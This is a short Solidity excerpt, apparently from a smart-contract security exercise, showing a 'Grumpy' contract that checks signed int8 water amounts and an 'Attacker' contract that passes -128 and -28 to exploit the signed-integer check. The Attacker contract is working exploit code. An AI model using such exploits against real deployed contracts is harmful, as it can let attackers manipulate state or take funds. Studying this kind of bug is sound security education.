...
contract Grumpy {
    ...
    function giveWaterToGrumpy(int8 _waterAmount) public {
        ...
        require(
            int16(currentWaterAmount) + int16(_waterAmount) <
                int16(targetWaterAmount)
        );
...
contract Attacker {
    ...
    constructor(Grumpy _add) public {
        original = _add;
    }

    function giveWaterToGrumpy() public {
        original.giveWaterToGrumpy(-128);
        original.giveWaterToGrumpy(-28);
    }
}
